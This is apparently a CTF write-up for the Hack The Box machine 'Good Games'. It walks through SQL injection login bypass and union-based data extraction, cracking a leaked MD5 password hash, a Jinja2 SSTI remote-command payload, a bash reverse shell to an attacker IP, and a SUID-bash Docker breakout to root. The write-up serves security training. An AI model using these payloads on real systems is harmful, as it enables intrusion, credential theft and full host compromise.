# Good Games

## General information

<h3>Difficulty: <img src="https://img.shields.io/badge/Easy%20-green?style=flat-square"> </h3>

<h3> Operation Sytem: Linux</h3> 

<h3> Vulnerability exploited. SQLI, SQTI, Docker Breakouts</h3>

<h3> Data of resolution: 15/01/2025 </h3>

<h3>Link: <a href="https://app.hackthebox.com/machines/GoodGames" target="_blank"> Good Games </a></h3>

### *Read this document in espagnol:* <a href="goodgames.md"> Good Games </a>

## Recognition

TryHackme provides us with the IP of the target machine **10.10.11.130**

I'm going to set the IP of the target machine in the **/etc/hosts** file, and I'm going to call it **goodgames**

### Ping

Depending on the result, we can deduce whether it's a Linux or Windows machine, for example:

```
ping -c 1 goodgames
```

**Its TTL is 63, so it's Linux**

### Open Port Scanning

#### TCP Port Scanning

The command I use with nmap is:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn goodgames
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open port | Service | Version                             |
| --------- | ------- | ----------------------------------- |
| 80        | http    | Werkzeug httpd 2.0.2 (Python 3.9.2) |

</div>

#### UDP port scanning

```
nmap -sU --top-ports 200 --min-rate=5000 -Pn <Ip de la victima>
```

All ports listed are closed

## Exploration

### Web Fuzzing

```
gobuster dir -u http://goodgames/ \
-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
-x txt,py,php,sh \
--exclude-length 9265
```

<p align="center"> 
<img src="images/fzw.png" width="600" alt="Resultado de Nmap">
</p>

```
http://goodgames/
```

<p align="center"> 
<img src="images/goodgames.png" width="600" alt="Resultado de Nmap">
</p>

```
http://goodgames/signup
```

<p align="center"> 
<img src="images/registro.png" width="600" alt="Resultado de Nmap">
</p>

```
http://goodgames/profile
```

<p align="center"> 
<img src="images/perfil.png" width="600" alt="Resultado de Nmap">
</p>

## Exploration

In burpsuite we capture the user registration navigation, and write the following

```
email=adasd@hotmail.com' or 1=1-- -&password=12345
```

We hit **Forward**

<p align="center"> 
<img src="images/bs.png" width="600" alt="Resultado de Nmap">
</p>

As a result we get this:

<p align="center"> 
<img src="images/exito.png" width="600" alt="Resultado de Nmap">
</p>

We visit the following page and see that we're logged in as an admin.

Remember to disable **FoxyProxy** to continue.

```
http://goodgames/profile
```

<p align="center"> 
<img src="images/rueda.png" width="600" alt="Resultado de Nmap">
</p>

As admin, we click on the **gear** and it will take us to a page

<p align="center"> 
<img src="images/null.png" width="600" alt="Resultado de Nmap">
</p>

For it to work we will have to go to the **/etc/hosts/** file and add the new route **internal-administration.goodgames.htb**

<p align="center"> 
<img src="images/login.png" width="600" alt="Resultado de Nmap">
</p>

**Prize**

Continuing with **bupsuite**, I want to know how many columns I have in my database, we will try with 20 columns...

```
email=dsjkda@hotmail.com' order by 20-- -&password=12345
```

<p align="center"> 
<img src="images/bs1.png" width="600" alt="Resultado de Nmap">
</p>

Now we will test if there are 4 columns in our database

<p align="center"> 
<img src="images/bs2.png" width="600" alt="Resultado de Nmap">
</p>

The **content-Length** number has changed, so it seems we've managed to find out how many columns we have, and if we search for welcome, it finally works for me.

<p align="center"> 
<img src="images/welcome.png" width="600" alt="Resultado de Nmap">
</p>

If I tried with other numbers, it didn't work for me, now we want to know the current database I'm using.

```
email=dsjkda@hotmail.com' union select 1,2,3,database()-- -&password=12345
```

<p align="center"> 
<img src="images/bs3.png" width="600" alt="Resultado de Nmap">
</p>

The current database is **main**

```
email=dsjkda@hotmail.com' union select 1,2,3,concat(schema_name, ':') from information_schema.schemata-- -&password=12345
```

<p align="center"> 
<img src="images/bs4.png" width="600" alt="Resultado de Nmap">
</p>

There are only two databases: **main and information_schema**

The **main** database has three tables

```
email=dsjkda@hotmail.com' union select 1,2,3,concat(table_name, ':') from information_schema.tables where table_schema = 'main'-- -&password=12345
```

<p align="center"> 
<img src="images/bs5.png" width="600" alt="Resultado de Nmap">
</p>

The **user** table has 4 columns: **id, email, password, and name**

```
email=dsjkda@hotmail.com' union select 1,2,3,concat(id, ':', email, ':', password, ':', name) from user-- -&password=12345
```

<p align="center"> 
<img src="images/bs6.png" width="600" alt="Resultado de Nmap">
</p>

We have a hash **2b22337f218b2d82dfc3b6f77e7cb8ec**

We visited the page <a href="https://crackstation.net/" target="_blank"> crackstation </a>

<p align="center"> 
<img src="images/crack.png" width="600" alt="Resultado de Nmap">
</p>

So the thing would be as follows:

**User**: admin \
**Contraseña**: superadministrator 

We go to the page **internal-administration.goodgames.htb**, enter the credentials, and we have entered

<p align="center"> 
<img src="images/logeado.png" width="600" alt="Resultado de Nmap">
</p>

If we go to the user profile it gives us the opportunity to edit the name, therefore, we are going to try to exploit the Server-Side Template Injection (SSTI) vulnerability.

```
{{7+7}}
```

<p align="center"> 
<img src="images/general.png" width="600" alt="Resultado de Nmap">
</p>

As a result...

<p align="center"> 
<img src="images/admin.png" width="600" alt="Resultado de Nmap">
</p>

It's vulnerable!

On this GitHub Page we can extract a necessary command, to get information from the page <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master" target="_blank"> PayloadsAllTheThings </a>

In my case, I realized that the vulnerability is **Server-Side Template Injection**. Within that folder, I found that by doing this **{{7+7}}** it is jinja2 for python. Therefore, we go to **python.md** and click **jinja2 - remote command execution**. We go to **Exploit The SSTI By Calling os.popen().read()** and copy the command.

<p align="center"> 
<img src="images/payload.png" width="600" alt="Resultado de Nmap">
</p>

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

<p align="center"> 
<img src="images/root.png" width="600" alt="Resultado de Nmap">
</p>

This command treats us as the **id** command and we realize that it is **root**...

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('hostname -i').read() }}
```

<p align="center"> 
<img src="images/hostname.png" width="600" alt="Resultado de Nmap">
</p>

I realize that the IP is not the same as the IP of the machine we are attacking.... This means that we are in a Docker container.

## Accessing a container

So, what I'm going to do next is access this container using a **reverse shell**

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "sh -i >& /dev/tcp/10.10.14.12/4444 0>&1"').read() }}
```

#### TTY

```
script /dev/null -c bash
```
**control z**

```
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

We're inside the container, including the tty handling (crazy)

To capture the first flag, we have to go to **/home/augustus/

```
cat user.txt
```

<p align="center"> 
<img src="images/flag.png" width="600" alt="Resultado de Nmap">
</p>

**By following these steps, I find out that the user augustus is not in the passwd file**

```
cat /etc/passwd | grep 1000
cat /etc/passwd | grep augustus
```

<p align="center"> 
<img src="images/grep.png" width="600" alt="Resultado de Nmap">
</p>

This confirms that it is mounted on a **mount**

```
mount | grep augustus
```

<p align="center"> 
<img src="images/augustus.png" width="600" alt="Resultado de Nmap">
</p>

Since we don't have nmap installed on this machine, it would be nice to create one to know which port is open. This command is the closest I could find to telling you which port is open, but first, I need to know what IP I'm dealing with.

```
ip route
```

<p align="center"> 
<img src="images/route.png" width="600" alt="Resultado de Nmap">
</p>

```
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
```

<p align="center"> 
<img src="images/port.png" width="600" alt="Resultado de Nmap">
</p>

Having the ssh port open, I can test with the credentials we already have, for example:

**user**: augustus \
**password**: superadministrator

```
ssh augustus@172.19.0.1
```

<p align="center"> 
<img src="images/whoami.png" width="600" alt="Resultado de Nmap">
</p>

### Privilege Escalation

At this point, the situation is as ingenious as it is absurd: within the Docker container, we have **root** access, and said container is directly connected to the victim machine. This means that, taking advantage of that connection and the superuser permissions in the container, we could copy the `/home/augustus` directory from the victim machine to the container and grant it administrator privileges. This is possible because network isolation and segmentation have not been properly used, allowing the container to interact freely with the host system.

So, the first thing I would do is locate myself in **augustus/**

<p align="center"> 
<img src="images/augus.png" width="600" alt="Resultado de Nmap">
</p>

Then copy the bash here

```
cp /bin/bash .
```

<p align="center"> 
<img src="images/bash.png" width="600" alt="Resultado de Nmap">
</p>

```
exit
chown root:root bash
chmod 4755 bash
```

*With chmod 4755* This causes the file to be executed **with the privileges of the file's owner**, not the privileges of the user who launched it.

<p align="center"> 
<img src="images/chmod.png" width="600" alt="Resultado de Nmap">
</p>

Who owns the bash file? Root, yes. Oh my God.

```
ssh augustus@172.19.0.1
./bash -p
```

In this case, what **-p** does is prevent you from being downgraded to the real user's permissions.

<p align="center"> 
<img src="images/-p.png" width="600" alt="Resultado de Nmap">
</p>

Now being root we can access the root flag

```
cat /root/root.txt
```

<p align="center"> 
<img src="images/flag2.png" width="600" alt="Resultado de Nmap">
</p>

**Machine termined**

## Conclusion

In my opinion, this machine is above the required level for eJPTv2, but it is very useful for measuring the level of difficulty we might encounter in more advanced challenges. Interestingly, it uses multiple attack vectors in a single exploit chain.

The intrusion begins in the login section, where we exploit a SQL injection to access it directly as the _admin user. From there, we discover a new page that is only accessible by registering its domain in the `/etc/hosts` file.

Once in this new location, we must continue using SQLi to obtain a username and password stored in MD5, which we subsequently decrypt. With these credentials, we can log in to the main panel.

In the user profile, we find a SSTI (Server-Side Template Injection) vulnerability, which we exploit to obtain a reverse shell to our attacker machine. Upon accessing the system, we verify that we are inside a Docker container with root privileges.

To pivot to the host machine, we investigated how to detect active services from the container and, through a scan, discovered that SSH was open. We tested with previously obtained users and credentials and managed to access the host machine, although initially only with user privileges.

At this point, we copied our bash binary from the host machine to a directory shared with the container. Once inside the container, we modified the binary's ownership and permissions to make it SUID root (chown root:root and chmod 4755). This way, when executed with ./bash -p from the host machine, we obtained a shell with root privileges and thus obtained the last flag.